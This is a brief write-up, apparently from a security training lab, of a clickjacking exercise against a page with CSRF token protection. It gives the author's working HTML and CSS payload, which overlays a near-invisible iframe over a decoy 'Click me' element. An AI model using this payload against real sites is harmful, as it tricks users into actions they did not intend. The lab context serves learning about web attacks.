Basic clickjacking with CSRF token protection

Another one of the Apprentice labs where the solution provided is fantastic. You might have to tweak the exploit a bit.
Here's what worked for me:

<style>
   iframe {
       position:relative;
       width:700;
       height: 500;
       opacity: 0.001;
       z-index: 2;
   }
   div {
       position:absolute;
       top:355;
       left:60;
       z-index: 1;
   }
</style>
<div>Click me</div>
